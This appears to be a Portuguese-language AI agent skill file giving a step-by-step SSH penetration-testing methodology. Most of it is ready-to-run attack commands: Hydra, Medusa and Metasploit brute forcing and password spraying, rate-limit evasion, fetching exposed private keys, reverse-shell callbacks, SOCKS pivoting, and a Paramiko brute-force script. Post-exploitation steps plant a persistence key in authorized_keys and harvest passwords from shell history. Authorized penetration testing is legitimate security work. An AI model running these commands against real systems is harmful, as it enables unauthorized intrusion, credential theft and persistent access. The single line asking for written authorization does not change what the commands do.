---
name: SSH Penetration Testing
description: Esta competência deve ser usada quando o usuário solicitar "testar segurança SSH", "enumerar configurações SSH", "força bruta em credenciais SSH", "explorar vulnerabilidades SSH", "realizar tunneling SSH" ou "auditar segurança SSH". Fornece metodologias e técnicas abrangentes de teste de penetração SSH.
metadata:
  author: zebbern
  version: "1.1"
---

# Teste de Penetração SSH

## Propósito

Conduzir avaliações abrangentes de segurança SSH incluindo enumeração, ataques de credencial, exploração de vulnerabilidades, técnicas de tunneling e atividades pós-exploração. Esta competência cobre a metodologia completa para testar a segurança do serviço SSH.

## Pré-requisitos

### Ferramentas Necessárias
- Nmap com scripts SSH
- Hydra ou Medusa para força bruta
- ssh-audit para análise de configuração
- Metasploit Framework
- Python com biblioteca Paramiko

### Conhecimento Necessário
- Conceitos fundamentais do protocolo SSH
- Autenticação por chave pública/privada
- Conceitos de port forwarding
- Proficiência em linha de comando Linux

## Resultados e Entregáveis

1. **Relatório de Enumeração SSH** - Versões, algoritmos, configurações
2. **Avaliação de Credenciais** - Senhas fracas, credenciais padrão
3. **Avaliação de Vulnerabilidades** - CVEs conhecidas, configurações incorretas
4. **Documentação de Tunnel** - Configurações de port forwarding

## Fluxo de Trabalho Principal

### Fase 1: Descoberta de Serviço SSH

Identificar serviços SSH em redes alvo:

```bash
# Varredura rápida de porta SSH
nmap -p 22 192.168.1.0/24 --open

# Portas SSH alternativas comuns
nmap -p 22,2222,22222,2200 192.168.1.100

# Varredura completa de portas para SSH
nmap -p- --open 192.168.1.100 | grep -i ssh

# Detecção de versão de serviço
nmap -sV -p 22 192.168.1.100
```

### Fase 2: Enumeração SSH

Reunir informações detalhadas sobre serviços SSH:

```bash
# Banner grabbing
nc 192.168.1.100 22
# Output: SSH-2.0-OpenSSH_8.4p1 Debian-5

# Telnet banner grab
telnet 192.168.1.100 22

# Detecção de versão Nmap com scripts
nmap -sV -p 22 --script ssh-hostkey 192.168.1.100

# Enumerar algoritmos suportados
nmap -p 22 --script ssh2-enum-algos 192.168.1.100

# Obter chaves do host
nmap -p 22 --script ssh-hostkey --script-args ssh_hostkey=full 192.168.1.100

# Verificar métodos de autenticação
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=root" 192.168.1.100
```

### Fase 3: Auditoria de Configuração SSH

Identificar configurações fracas:

```bash
# ssh-audit - auditoria SSH abrangente
ssh-audit 192.168.1.100

# ssh-audit com porta específica
ssh-audit -p 2222 192.168.1.100

# A saída inclui:
# - Recomendações de algoritmo
# - Vulnerabilidades de segurança
# - Sugestões de hardening
```

Principais fraquezas de configuração a identificar:
- Algoritmos de troca de chave fracos (diffie-hellman-group1-sha1)
- Criptografias fracas (arcfour, 3des-cbc)
- MACs fracos (hmac-md5, hmac-sha1-96)
- Versões de protocolo descontinuadas

### Fase 4: Ataques de Credencial

#### Força Bruta com Hydra

```bash
# Usuário único, lista de senhas
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# Lista de usuários, senha única
hydra -L users.txt -p Password123 ssh://192.168.1.100

# Listas de usuários e senhas
hydra -L users.txt -P passwords.txt ssh://192.168.1.100

# Com porta específica
hydra -l admin -P passwords.txt -s 2222 ssh://192.168.1.100

# Evasão de rate limiting (lento)
hydra -l admin -P passwords.txt -t 1 -w 5 ssh://192.168.1.100

# Saída verbose
hydra -l admin -P passwords.txt -vV ssh://192.168.1.100

# Sair no primeiro sucesso
hydra -l admin -P passwords.txt -f ssh://192.168.1.100
```

#### Força Bruta com Medusa

```bash
# Força bruta básica
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh

# Múltiplos alvo
medusa -H targets.txt -u admin -P passwords.txt -M ssh

# Com lista de usuários
medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ssh

# Porta específica
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh -n 2222
```

#### Password Spraying

```bash
# Testar senha comum entre usuários
hydra -L users.txt -p Summer2024! ssh://192.168.1.100

# Múltiplas senhas comuns
for pass in "Password123" "Welcome1" "Summer2024!"; do
    hydra -L users.txt -p "$pass" ssh://192.168.1.100
done
```

### Fase 5: Teste de Autenticação Baseada em Chave

Testar chaves fracas ou expostas:

```bash
# Tentar login com chave privada encontrada
ssh -i id_rsa user@192.168.1.100

# Especificar chave explicitamente (bypass do agent)
ssh -o IdentitiesOnly=yes -i id_rsa user@192.168.1.100

# Forçar autenticação por senha
ssh -o PreferredAuthentications=password user@192.168.1.100

# Tentar nomes de chave comuns
for key in id_rsa id_dsa id_ecdsa id_ed25519; do
    ssh -i "$key" user@192.168.1.100
done
```

Verificar chaves expostas:

```bash
# Localizações comuns para chaves privadas
~/.ssh/id_rsa
~/.ssh/id_dsa
~/.ssh/id_ecdsa
~/.ssh/id_ed25519
/etc/ssh/ssh_host_*_key
/root/.ssh/
/home/*/.ssh/

# Chaves acessíveis pela web (verificar com curl/wget)
curl -s http://target.com/.ssh/id_rsa
curl -s http://target.com/id_rsa
curl -s http://target.com/backup/ssh_keys.tar.gz
```

### Fase 6: Exploração de Vulnerabilidade

Procurar vulnerabilidades conhecidas:

```bash
# Procurar exploits
searchsploit openssh
searchsploit openssh 7.2

# Vulnerabilidades comuns de SSH
# CVE-2018-15473 - Enumeração de usuário
# CVE-2016-0777 - Vulnerabilidade Roaming
# CVE-2016-0778 - Buffer overflow

# Enumeração Metasploit
msfconsole
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.100
run

# Enumeração de usuário (CVE-2018-15473)
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS 192.168.1.100
set USER_FILE /usr/share/wordlists/users.txt
run
```

### Fase 7: Tunneling SSH e Port Forwarding

#### Local Port Forwarding

Encaminhar porta local para serviço remoto:

```bash
# Sintaxe: ssh -L <local_port>:<remote_host>:<remote_port> user@ssh_server

# Acessar servidor web interno através de SSH
ssh -L 8080:192.168.1.50:80 user@192.168.1.100
# Agora acesse http://localhost:8080

# Acessar banco de dados interno
ssh -L 3306:192.168.1.50:3306 user@192.168.1.100

# Múltiplos encaminhamentos
ssh -L 8080:192.168.1.50:80 -L 3306:192.168.1.51:3306 user@192.168.1.100
```

#### Remote Port Forwarding

Expor serviço local para rede remota:

```bash
# Sintaxe: ssh -R <remote_port>:<local_host>:<local_port> user@ssh_server

# Expor servidor web local para remoto
ssh -R 8080:localhost:80 user@192.168.1.100
# Remoto pode acessar via localhost:8080

# Callback de reverse shell
ssh -R 4444:localhost:4444 user@192.168.1.100
```

#### Dynamic Port Forwarding (SOCKS Proxy)

Criar proxy SOCKS para pivot de rede:

```bash
# Criar proxy SOCKS na porta local 1080
ssh -D 1080 user@192.168.1.100

# Usar com proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
proxychains nmap -sT -Pn 192.168.1.0/24

# Configuração de navegador
# Definir proxy SOCKS para localhost:1080
```

#### ProxyJump (Jump Hosts)

Encadear através de múltiplos servidores SSH:

```bash
# Pular através de host intermediário
ssh -J user1@jump_host user2@target_host

# Múltiplos saltos
ssh -J user1@jump1,user2@jump2 user3@target

# Com configuração SSH
# ~/.ssh/config
Host target
    HostName 192.168.2.50
    User admin
    ProxyJump user@192.168.1.100
```

### Fase 8: Pós-Exploração

Atividades após ganhar acesso SSH:

```bash
# Verificar privilégios sudo
sudo -l

# Encontrar chaves SSH
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null

# Verificar diretório SSH
ls -la ~/.ssh/
cat ~/.ssh/known_hosts
cat ~/.ssh/authorized_keys

# Adicionar persistência (adicionar sua chave)
echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys

# Extrair configuração SSH
cat /etc/ssh/sshd_config

# Encontrar outros usuários
cat /etc/passwd | grep -v nologin
ls /home/

# Histórico para credenciais
cat ~/.bash_history | grep -i ssh
cat ~/.bash_history | grep -i pass
```

### Fase 9: Scripts SSH Customizados com Paramiko

Automação SSH baseada em Python:

```python
#!/usr/bin/env python3
import paramiko
import sys

def ssh_connect(host, username, password):
    """Tentar conexão SSH com credenciais"""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        client.connect(host, username=username, password=password, timeout=5)
        print(f"[+] Sucesso: {username}:{password}")
        return client
    except paramiko.AuthenticationException:
        print(f"[-] Falhou: {username}:{password}")
        return None
    except Exception as e:
        print(f"[!] Erro: {e}")
        return None

def execute_command(client, command):
    """Executar comando via SSH"""
    stdin, stdout, stderr = client.exec_command(command)
    output = stdout.read().decode()
    errors = stderr.read().decode()
    return output, errors

def ssh_brute_force(host, username, wordlist):
    """Força bruta SSH com wordlist"""
    with open(wordlist, 'r') as f:
        passwords = f.read().splitlines()
    
    for password in passwords:
        client = ssh_connect(host, username, password.strip())
        if client:
            # Executar comandos pós-exploração
            output, _ = execute_command(client, 'id; uname -a')
            print(output)
            client.close()
            return True
    return False

# Uso
if __name__ == "__main__":
    target = "192.168.1.100"
    user = "admin"
    
    # Teste de credencial único
    client = ssh_connect(target, user, "password123")
    if client:
        output, _ = execute_command(client, "ls -la")
        print(output)
        client.close()
```

### Fase 10: Módulos Metasploit SSH

Usar Metasploit para teste SSH abrangente:

```bash
# Iniciar Metasploit
msfconsole

# Scanner de versão SSH
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.0/24
run

# Força bruta de login SSH
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.100
set USERNAME admin
set PASS_FILE /usr/share/wordlists/rockyou.txt
set VERBOSE true
run

# Login por chave SSH
use auxiliary/scanner/ssh/ssh_login_pubkey
set RHOSTS 192.168.1.100
set USERNAME admin
set KEY_FILE /path/to/id_rsa
run

# Enumeração de usuário
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS 192.168.1.100
set USER_FILE users.txt
run

# Pós-exploração com sessão SSH
sessions -i 1
```

## Referência Rápida

### Comandos de Enumeração SSH

| Comando | Propósito |
|---------|-----------|
| `nc <host> 22` | Banner grabbing |
| `ssh-audit <host>` | Auditoria de configuração |
| `nmap --script ssh*` | Scripts SSH NSE |
| `searchsploit openssh` | Encontrar exploits |

### Opções de Força Bruta

| Ferramenta | Comando |
|------------|---------|
| Hydra | `hydra -l user -P pass.txt ssh://host` |
| Medusa | `medusa -h host -u user -P pass.txt -M ssh` |
| Ncrack | `ncrack -p 22 --user admin -P pass.txt host` |
| Metasploit | `use auxiliary/scanner/ssh/ssh_login` |

### Tipos de Port Forwarding

| Tipo | Comando | Caso de Uso |
|------|---------|-----------|
| Local | `-L 8080:target:80` | Acessar serviços remotos localmente |
| Remoto | `-R 8080:localhost:80` | Expor serviços locais remotamente |
| Dinâmico | `-D 1080` | Proxy SOCKS para pivoting |

### Portas SSH Comuns

| Porta | Descrição |
|-------|-----------|
| 22 | SSH padrão |
| 2222 | Alternativa comum |
| 22222 | Outra alternativa |
| 830 | NETCONF sobre SSH |

## Restrições e Limitações

### Considerações Legais
- Sempre obter autorização escrita
- Força bruta pode violar ToS
- Documentar todas as atividades de teste

### Limitações Técnicas
- Rate limiting pode bloquear ataques
- Fail2ban ou similar pode banir IPs
- Autenticação baseada em chave previne ataques de senha
- Autenticação de dois fatores adiciona complexidade

### Técnicas de Evasão
- Usar força bruta lenta: `-t 1 -w 5`
- Distribuir ataques entre IPs
- Usar enumeração baseada em timing com cuidado
- Respeitar limites de lockout

## Solução de Problemas

| Problema | Soluções |
|----------|----------|
| Conexão Recusada | Verificar SSH em execução; verificar firewall; confirmar porta; testar de IP diferente |
| Falhas de Autenticação | Verificar usuário; verificar política de senha; permissões de chave (600); formato authorized_keys |
| Tunnel Não Funcionando | Verificar GatewayPorts/AllowTcpForwarding em sshd_config; verificar firewall; usar `ssh -v` |